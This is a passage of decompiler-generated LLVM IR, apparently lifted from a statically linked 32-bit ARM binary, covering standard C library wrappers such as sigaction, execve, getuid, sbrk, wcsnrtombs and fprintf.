  store i32 %storemerge, i32* @r1, align 4
  %v2_16090 = icmp eq i32 %v0_16090, 0
  %.v2_16024 = select i1 %v2_16090, i32 0, i32 %v2_16024
  store i32 %.v2_16024, i32* @r2, align 4
  store i32 %v0_160a0, i32* %r0.global-to-local, align 4
  %v1_160a4 = call i32 @__syscall_rt_sigaction(i32 %v0_160a0)
  store i32 %v1_160a4, i32* %r0.global-to-local, align 4
  %v0_160a8 = load i32, i32* @r5, align 4
  %v2_160a8 = icmp eq i32 %v0_160a8, 0
  br i1 %v2_160a8, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_16090
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_16090, %bb25
  %v0_160b8.pr = phi i32 [ 0, %dec_label_pc_16090 ], [ 1, %bb25 ]
  %v1_160b0 = icmp slt i32 %v1_160a4, 0
  br i1 %v1_160b0, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_160ec

thread-pre-split:                                 ; preds = %bb26
  %v2_160b8 = icmp eq i32 %v0_160b8.pr, 0
  store i32 %v1_160a4, i32* @r4, align 4
  br i1 %v2_160b8, label %dec_label_pc_160ec, label %dec_label_pc_160c4

dec_label_pc_160c4:                               ; preds = %thread-pre-split
  %v2_160c4 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_160a8, i32* %r0.global-to-local, align 4
  %v2_160cc = inttoptr i32 %v0_160a8 to i32*
  store i32 %v2_160c4, i32* %v2_160cc, align 4
  %v3_160cc = load i32, i32* %r0.global-to-local, align 4
  %v4_160cc = add i32 %v3_160cc, 4
  store i32 %v4_160cc, i32* @r0, align 4
  %v2_160d0 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_160d0, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_160d8 = call i32 @memcpy()
  store i32 %v0_160d8, i32* %r0.global-to-local, align 4
  %v1_160e0 = load i32, i32* @r5, align 4
  %v2_160e0 = add i32 %v1_160e0, 136
  %v3_160e0 = inttoptr i32 %v2_160e0 to i32*
  %v1_160e8 = load i32, i32* @r5, align 4
  %v2_160e8 = add i32 %v1_160e8, 132
  %v3_160e8 = inttoptr i32 %v2_160e8 to i32*
  %v0_160ec.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160ec

dec_label_pc_160ec:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_160c4
  %v0_160ec = phi i32 [ %v1_160a4, %thread-pre-split ], [ %v0_160ec.pre, %dec_label_pc_160c4 ], [ %v1_160a4, %thread-pre-split.thread ]
  store i32 %v0_160ec, i32* %r0.global-to-local, align 4
  store i32 %v3_1601c, i32* @r4, align 4
  store i32 %v6_1601c, i32* @r5, align 4
  ret i32 %v0_160ec

; uselistorder directives
  uselistorder i32 %v0_160ec, { 1, 0 }
  uselistorder i32 %v0_160a8, { 1, 0, 2 }
  uselistorder i32 %v0_160a0, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder i32 136, { 1, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder label %dec_label_pc_160ec, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_16080, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_16100 = load i32, i32* @r4, align 4
  store i32 %v3_16100, i32* %stack_var_-8, align 4
  %v0_16104 = load i32, i32* @r0, align 4
  %v0_16108 = call i32 @__errno_location()
  %v1_1610c = sub i32 0, %v0_16104
  %v2_16110 = inttoptr i32 %v0_16108 to i32*
  store i32 %v1_1610c, i32* %v2_16110, align 4
  %v2_16118 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16118, i32* @r4, align 4
  ret i32 -1
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_1611c = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_1611c
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_16120 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_16120
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16124 = load i32, i32* @r4, align 4
  store i32 %v3_16124, i32* %stack_var_-8, align 4
  %v1_16128 = load i32, i32* @r1, align 4
  %v2_16128 = inttoptr i32 %v1_16128 to %sigaction*
  %v3_16128 = load i32, i32* @r2, align 4
  %v4_16128 = inttoptr i32 %v3_16128 to %sigaction*
  %v5_16128 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_16128, %sigaction* %v4_16128)
  store i32 %v5_16128, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_16128, -4095
  br i1 %tmp, label %dec_label_pc_16148, label %dec_label_pc_16138

dec_label_pc_16138:                               ; preds = %entry
  %v0_16138 = call i32 @__errno_location()
  %v0_1613c = load i32, i32* %r4.global-to-local, align 4
  %v1_1613c = sub i32 0, %v0_1613c
  %v2_16140 = inttoptr i32 %v0_16138 to i32*
  store i32 %v1_1613c, i32* %v2_16140, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16148

dec_label_pc_16148:                               ; preds = %entry, %dec_label_pc_16138
  %v0_16148 = phi i32 [ %v5_16128, %entry ], [ -1, %dec_label_pc_16138 ]
  %v2_1614c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1614c, i32* %r4.global-to-local, align 4
  ret i32 %v0_16148

; uselistorder directives
  uselistorder i32 %v5_16128, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16148, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16150 = load i32, i32* @r4, align 4
  store i32 %v3_16150, i32* %stack_var_-8, align 4
  %v0_16154 = load i32, i32* @r0, align 4
  %v1_16154 = inttoptr i32 %v0_16154 to i8*
  %v2_16154 = load i32, i32* @r1, align 4
  %v3_16154 = inttoptr i32 %v2_16154 to i8*
  %v4_16154 = insertvalue [1 x i8*] undef, i8* %v3_16154, 0
  %v5_16154 = load i32, i32* @r2, align 4
  %v6_16154 = inttoptr i32 %v5_16154 to i8*
  %v7_16154 = insertvalue [1 x i8*] undef, i8* %v6_16154, 0
  %v8_16154 = call i32 @execve(i8* %v1_16154, [1 x i8*] %v4_16154, [1 x i8*] %v7_16154)
  store i32 %v8_16154, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_16154, -4095
  br i1 %tmp, label %dec_label_pc_16174, label %dec_label_pc_16164

dec_label_pc_16164:                               ; preds = %entry
  %v0_16164 = call i32 @__errno_location()
  %v0_16168 = load i32, i32* %r4.global-to-local, align 4
  %v1_16168 = sub i32 0, %v0_16168
  %v2_1616c = inttoptr i32 %v0_16164 to i32*
  store i32 %v1_16168, i32* %v2_1616c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16174

dec_label_pc_16174:                               ; preds = %entry, %dec_label_pc_16164
  %v0_16174 = phi i32 [ %v8_16154, %entry ], [ -1, %dec_label_pc_16164 ]
  %v2_16178 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16178, i32* @r4, align 4
  ret i32 %v0_16174

; uselistorder directives
  uselistorder i32 %v8_16154, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16174, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1617c = load i32, i32* @r4, align 4
  store i32 %v3_1617c, i32* %stack_var_-8, align 4
  %v0_16184 = load i32, i32* @r0, align 4
  store i32 %v0_16184, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16184, -4095
  br i1 %tmp, label %dec_label_pc_161a0, label %dec_label_pc_16190

dec_label_pc_16190:                               ; preds = %entry
  %v0_16190 = call i32 @__errno_location()
  %v0_16194 = load i32, i32* %r4.global-to-local, align 4
  %v1_16194 = sub i32 0, %v0_16194
  %v2_16198 = inttoptr i32 %v0_16190 to i32*
  store i32 %v1_16194, i32* %v2_16198, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_161a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161a0:                               ; preds = %entry, %dec_label_pc_16190
  %v2_161a4 = phi i32 [ %v3_1617c, %entry ], [ %v2_161a4.pre, %dec_label_pc_16190 ]
  %v0_161a0 = phi i32 [ %v0_16184, %entry ], [ -1, %dec_label_pc_16190 ]
  store i32 %v2_161a4, i32* @r4, align 4
  ret i32 %v0_161a0

; uselistorder directives
  uselistorder i32 %v0_16184, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161a0, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_161a8 = load i32, i32* @r4, align 4
  store i32 %v3_161a8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_161cc, label %dec_label_pc_161bc

dec_label_pc_161bc:                               ; preds = %entry
  %v0_161bc = call i32 @__errno_location()
  %v0_161c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_161c0 = sub i32 0, %v0_161c0
  %v2_161c4 = inttoptr i32 %v0_161bc to i32*
  store i32 %v1_161c0, i32* %v2_161c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_161d0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_161cc

dec_label_pc_161cc:                               ; preds = %entry, %dec_label_pc_161bc
  %v2_161d0 = phi i32 [ %v3_161a8, %entry ], [ %v2_161d0.pre, %dec_label_pc_161bc ]
  %v0_161cc = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_161bc ]
  store i32 %v2_161d0, i32* %r4.global-to-local, align 4
  ret i32 %v0_161cc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161cc, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_161d4 = load i32, i32* @r4, align 4
  store i32 %v3_161d4, i32* %stack_var_-8, align 4
  %v0_161dc = load i32, i32* @r0, align 4
  store i32 %v0_161dc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_161dc, -4095
  br i1 %tmp, label %dec_label_pc_161f8, label %dec_label_pc_161e8

dec_label_pc_161e8:                               ; preds = %entry
  %v0_161e8 = call i32 @__errno_location()
  %v0_161ec = load i32, i32* %r4.global-to-local, align 4
  %v1_161ec = sub i32 0, %v0_161ec
  %v2_161f0 = inttoptr i32 %v0_161e8 to i32*
  store i32 %v1_161ec, i32* %v2_161f0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_161fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_161f8

dec_label_pc_161f8:                               ; preds = %entry, %dec_label_pc_161e8
  %v2_161fc = phi i32 [ %v3_161d4, %entry ], [ %v2_161fc.pre, %dec_label_pc_161e8 ]
  %v0_161f8 = phi i32 [ %v0_161dc, %entry ], [ -1, %dec_label_pc_161e8 ]
  store i32 %v2_161fc, i32* %r4.global-to-local, align 4
  ret i32 %v0_161f8

; uselistorder directives
  uselistorder i32 %v0_161dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_161f8, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_16200 = load i32, i32* @r4, align 4
  store i32 %v3_16200, i32* %stack_var_-8, align 4
  %v6_16204 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_16204, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_16204, -4095
  br i1 %tmp6, label %dec_label_pc_16224, label %dec_label_pc_16214

dec_label_pc_16214:                               ; preds = %entry
  %v0_16214 = call i32 @__errno_location()
  %v0_16218 = load i32, i32* %r4.global-to-local, align 4
  %v1_16218 = sub i32 0, %v0_16218
  %v2_1621c = inttoptr i32 %v0_16214 to i32*
  store i32 %v1_16218, i32* %v2_1621c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16224

dec_label_pc_16224:                               ; preds = %entry, %dec_label_pc_16214
  %v0_16224 = phi i32 [ %v6_16204, %entry ], [ -1, %dec_label_pc_16214 ]
  %v2_16228 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16228, i32* %r4.global-to-local, align 4
  ret i32 %v0_16224

; uselistorder directives
  uselistorder i32 %v6_16204, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16224, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1622c = load i32, i32* @r4, align 4
  store i32 %v3_1622c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2fb84.1246 to i32), i32* %r4.global-to-local, align 4
  %v2_16234 = load i32, i32* @global_var_2fb84.1246, align 4
  %v2_16238 = icmp eq i32 %v2_16234, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_16238, label %dec_label_pc_16248, label %dec_label_pc_16254

dec_label_pc_16248:                               ; preds = %entry
  %v2_16248 = call i32 @__GI_brk(i32* null)
  %v1_1624c = icmp slt i32 %v2_16248, 0
  br i1 %v1_1624c, label %dec_label_pc_16274, label %dec_label_pc_16254thread-pre-split

dec_label_pc_16254thread-pre-split:               ; preds = %dec_label_pc_16248
  %v0_16258.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_16254.pre = load i32, i32* @global_var_2fb84.1246, align 4
  br label %dec_label_pc_16254

dec_label_pc_16254:                               ; preds = %dec_label_pc_16254thread-pre-split, %entry
  %v2_16254 = phi i32 [ %v2_16254.pre, %dec_label_pc_16254thread-pre-split ], [ %v2_16234, %entry ]
  %v1_16260 = phi i32 [ %v0_16258.pr, %dec_label_pc_16254thread-pre-split ], [ %arg1, %entry ]
  %v2_16258 = icmp eq i32 %v1_16260, 0
  store i32 %v2_16254, i32* %r4.global-to-local, align 4
  br i1 %v2_16258, label %dec_label_pc_16278, label %dec_label_pc_16268

dec_label_pc_16268:                               ; preds = %dec_label_pc_16254
  %v2_16260 = add i32 %v1_16260, %v2_16254
  %v1_16268 = inttoptr i32 %v2_16260 to i32*
  %v2_16268 = call i32 @__GI_brk(i32* %v1_16268)
  %v1_1626c = icmp slt i32 %v2_16268, 0
  br i1 %v1_1626c, label %dec_label_pc_16274, label %dec_label_pc_16268.dec_label_pc_16278_crit_edge

dec_label_pc_16268.dec_label_pc_16278_crit_edge:  ; preds = %dec_label_pc_16268
  %v0_16278.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16278

dec_label_pc_16274:                               ; preds = %dec_label_pc_16268, %dec_label_pc_16248
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16278

dec_label_pc_16278:                               ; preds = %dec_label_pc_16268.dec_label_pc_16278_crit_edge, %dec_label_pc_16254, %dec_label_pc_16274
  %v0_16278 = phi i32 [ %v0_16278.pre, %dec_label_pc_16268.dec_label_pc_16278_crit_edge ], [ %v2_16254, %dec_label_pc_16254 ], [ -1, %dec_label_pc_16274 ]
  %v2_1627c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1627c, i32* @r4, align 4
  ret i32 %v0_16278

; uselistorder directives
  uselistorder i32 %v2_16254, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 15, 16, 14, 13, 12, 19, 20, 21, 2 }
  uselistorder label %dec_label_pc_16278, { 2, 0, 1 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16284 = load i32, i32* @r4, align 4
  store i32 %v3_16284, i32* %stack_var_-8, align 4
  %v0_16288 = call i32 @wait4()
  store i32 %v0_16288, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16288, -4095
  br i1 %tmp, label %dec_label_pc_162a8, label %dec_label_pc_16298

dec_label_pc_16298:                               ; preds = %entry
  %v0_16298 = call i32 @__errno_location()
  %v0_1629c = load i32, i32* %r4.global-to-local, align 4
  %v1_1629c = sub i32 0, %v0_1629c
  %v2_162a0 = inttoptr i32 %v0_16298 to i32*
  store i32 %v1_1629c, i32* %v2_162a0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_162a8

dec_label_pc_162a8:                               ; preds = %entry, %dec_label_pc_16298
  %v0_162a8 = phi i32 [ %v0_16288, %entry ], [ -1, %dec_label_pc_16298 ]
  %v2_162ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_162ac, i32* @r4, align 4
  ret i32 %v0_162a8

; uselistorder directives
  uselistorder i32 %v0_16288, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_162a8, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_2fb64.1248 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_162c0 = icmp eq i32 %arg1, 0
  br i1 %v2_162c0, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_162c8 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_162f0 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_162e4 = phi i32 [ %arg1, %.thread ], [ %v3_162c8, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_162dc = ptrtoint i32* %stack_var_-16 to i32
  %v2_162e8 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_162e8, i32* %stack_var_-16, align 4
  store i32 %v0_162f0, i32* %stack_var_-12, align 4
  %v5_162f8 = inttoptr i32 %v0_162e4 to i8*
  %v6_162f8 = call i32 @__GI_wcsnrtombs(i8* %v5_162f8, i32 %v2_162dc, i32 1, i32 16, i32 %arg3)
  %v2_162fc = icmp eq i32 %v6_162f8, 0
  br i1 %v2_162fc, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_16308 = phi i32 [ %v6_162f8, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_16308

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_16318 = load i32, i32* @r2, align 4
  store i32 %v0_16318, i32* @r3, align 4
  %v0_16320 = load i32, i32* @r0, align 4
  %v1_16320 = load i32, i32* @r1, align 4
  %v5_16320 = inttoptr i32 %v0_16320 to i8*
  %v6_16320 = call i32 @__GI_wcsnrtombs(i8* %v5_16320, i32 %v1_16320, i32 -1, i32 %v0_16318, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_16320
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1632c = load i32, i32* @r4, align 4
  store i32 %v3_1632c, i32* %stack_var_-8, align 4
  %v10_16330 = icmp eq i32 %tmp, %arg2
  br i1 %v10_16330, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_163381 = load i32, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1634c

bb:                                               ; preds = %entry
  %v4_16334 = icmp eq i8* %arg1, null
  %v0_16338 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br i1 %v4_16334, label %dec_label_pc_1634c, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16388

dec_label_pc_1634c:                               ; preds = %.thread, %bb
  %v1_1638c.ph = phi i32 [ %v0_16338, %bb ], [ %v0_163381, %.thread ]
  %v2_1633c3.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_1634c = icmp eq i8* %arg1, null
  store i32 %v2_1633c3.ph, i32* %ip.global-to-local, align 4
  br i1 %v3_1634c, label %.thread4, label %dec_label_pc_16380

.thread4:                                         ; preds = %dec_label_pc_1634c
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_16388

dec_label_pc_16364:                               ; preds = %dec_label_pc_163a0
  %v0_16364 = call i32 @__errno_location()
  store i32 %v0_16364, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16370 = inttoptr i32 %v0_16364 to i32*
  store i32 84, i32* %v2_16370, align 4
  %v0_163dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163dc

dec_label_pc_16378:                               ; preds = %dec_label_pc_163b0
  %v3_163b4 = zext i8 %v2_163b4 to i32
  store i32 %v3_163b4, i32* @lr, align 4
  br label %dec_label_pc_163d0

dec_label_pc_16380:                               ; preds = %dec_label_pc_1634c
  store i32 %v2_1633c3.ph, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16388

dec_label_pc_16388:                               ; preds = %bb27, %.thread4, %dec_label_pc_16380
  %v1_1638c20 = phi i32 [ %v0_16338, %bb27 ], [ %v1_1638c.ph, %.thread4 ], [ %v1_1638c.ph, %dec_label_pc_16380 ]
  %v2_163b014 = phi i32 [ %tmp, %bb27 ], [ %v2_1633c3.ph, %.thread4 ], [ %v2_1633c3.ph, %dec_label_pc_16380 ]
  %v1_16388 = load i32, i32* @r3, align 4
  %v3_16388 = icmp uge i32 %v1_1638c20, %v1_16388
  %v1_16388.v1_1638c20 = select i1 %v3_16388, i32 %v1_16388, i32 %v1_1638c20
  store i32 %v1_16388.v1_1638c20, i32* %r4.global-to-local, align 4
  %v1_16394 = inttoptr i32 %arg2 to i32*
  %v2_16394 = load i32, i32* %v1_16394, align 4
  store i32 %v2_16394, i32* @lr, align 4
  store i32 %v1_16388.v1_1638c20, i32* %r0.global-to-local, align 4
  %v2_163c88 = icmp eq i32 %v1_16388.v1_1638c20, 0
  br i1 %v2_163c88, label %dec_label_pc_163d0, label %dec_label_pc_163a0

dec_label_pc_163a0:                               ; preds = %dec_label_pc_16388, %dec_label_pc_163c0.dec_label_pc_163a0_crit_edge
  %v2_163b0 = phi i32 [ %v2_163c0, %dec_label_pc_163c0.dec_label_pc_163a0_crit_edge ], [ %v2_163b014, %dec_label_pc_16388 ]
  %v0_163a8 = phi i32 [ %v0_163a0.pre, %dec_label_pc_163c0.dec_label_pc_163a0_crit_edge ], [ %v2_16394, %dec_label_pc_16388 ]
  %v1_163a0 = inttoptr i32 %v0_163a8 to i32*
  %v2_163a0 = load i32, i32* %v1_163a0, align 4
  %v1_163a8 = add i32 %v0_163a8, 4
  store i32 %v1_163a8, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_163a0, 127
  br i1 %tmp36, label %dec_label_pc_16364, label %dec_label_pc_163b0

dec_label_pc_163b0:                               ; preds = %dec_label_pc_163a0
  %v1_163b0 = trunc i32 %v2_163a0 to i8
  %v3_163b0 = inttoptr i32 %v2_163b0 to i8*
  store i8 %v1_163b0, i8* %v3_163b0, align 1
  %v0_163b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_163b4 = inttoptr i32 %v0_163b4 to i8*
  %v2_163b4 = load i8, i8* %v1_163b4, align 1
  %v2_163b8 = icmp eq i8 %v2_163b4, 0
  br i1 %v2_163b8, label %dec_label_pc_16378, label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %dec_label_pc_163b0
  %v1_163c0 = load i32, i32* %r2.global-to-local, align 4
  %v2_163c0 = add i32 %v1_163c0, %v0_163b4
  store i32 %v2_163c0, i32* %ip.global-to-local, align 4
  %v0_163c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_163c4 = add i32 %v0_163c4, -1
  store i32 %v1_163c4, i32* %r0.global-to-local, align 4
  %v2_163c8 = icmp eq i32 %v1_163c4, 0
  br i1 %v2_163c8, label %dec_label_pc_163d0, label %dec_label_pc_163c0.dec_label_pc_163a0_crit_edge

dec_label_pc_163c0.dec_label_pc_163a0_crit_edge:  ; preds = %dec_label_pc_163c0
  %v0_163a0.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_163a0

dec_label_pc_163d0:                               ; preds = %dec_label_pc_163c0, %dec_label_pc_16388, %dec_label_pc_16378
  %v0_163d0 = phi i32 [ %v0_163b4, %dec_label_pc_16378 ], [ %v2_163b014, %dec_label_pc_16388 ], [ %v2_163c0, %dec_label_pc_163c0 ]
  %v1_163d0 = load i32, i32* @sp, align 4
  %v9_163d0 = icmp eq i32 %v0_163d0, %v1_163d0
  br i1 %v9_163d0, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_163d0
  %v1_163d4 = load i32, i32* @lr, align 4
  store i32 %v1_163d4, i32* %v1_16394, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_163d0, %bb30
  %v0_163d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_163d8 = load i32, i32* %r4.global-to-local, align 4
  %v2_163d8 = sub i32 %v1_163d8, %v0_163d8
  store i32 %v2_163d8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_163dc

dec_label_pc_163dc:                               ; preds = %dec_label_pc_16364, %bb31
  %v0_163dc = phi i32 [ %v0_163dc.pre, %dec_label_pc_16364 ], [ %v2_163d8, %bb31 ]
  store i32 %v0_163dc, i32* %r0.global-to-local, align 4
  %v2_163e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_163e4, i32* %r4.global-to-local, align 4
  ret i32 %v0_163dc

; uselistorder directives
  uselistorder i32 %v0_163dc, { 1, 0 }
  uselistorder i32 %v1_163c4, { 1, 0 }
  uselistorder i32 %v2_163c0, { 0, 2, 1 }
  uselistorder i32 %v2_163a0, { 1, 0 }
  uselistorder i32 %v2_163b014, { 1, 0 }
  uselistorder i32 %v1_1638c.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 4, 1, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32* @sp, { 12, 13, 0, 7, 8, 9, 10, 1, 2, 3, 4, 5, 6, 11 }
  uselistorder i32 127, { 0, 1, 3, 5, 4, 2 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_163dc, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_163a0, { 1, 0 }
  uselistorder label %dec_label_pc_16388, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1634c, { 1, 0 }
}

define i32 @fprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_163f4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_163f4, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_16404 = call i32 @__GI_vfprintf()
  ret i32 %v0_16404

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
